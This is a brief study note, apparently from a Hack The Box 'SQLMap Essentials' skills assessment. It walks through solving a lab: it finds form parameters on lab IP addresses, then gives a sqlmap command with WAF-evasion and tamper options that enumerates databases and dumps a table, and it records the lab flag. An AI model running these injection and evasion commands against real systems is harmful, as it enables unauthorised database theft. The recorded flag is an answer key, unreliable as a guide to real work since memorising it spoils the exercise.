---
tags: [CWES, HTB, technical-reference]
module: "SQLMap Essentials"
source_file: "CWES.xmind"
---

# Skills Assessment

> [!info] Complete technical reference
> Section imported without removing commands, hints, links, notes, or images.

## What's the contents of table final_flag?

### --forms --crawl=2

- found parameters
  - http://83.136.251.105:36666/checkout.html?=&optradio=on
  - POST http://83.136.251.105:36666/shop.html  
    POST data: people=%23&people=%23
### run Developer tool and look for attacking vector

- foumd POST request
  - sqlmap -u 'http://94.237.121.111:53296/action.php' \  
    -X POST \  
    ...  
    --data-raw '{"id":1}' --batch
    - sqlmap -u 'http://94.237.121.111:53296/action.php'   -X POST  ...   --data-raw '{"id":1}' --batch --skip-waf --no-cast --random-agent --chunked --tamper=between,randomcase --dbs
      - [*] information_schema  
        [*] production
        - -D production -T final_flag --dump
          - HTB{n07_50_h4rd_r16h7?!}
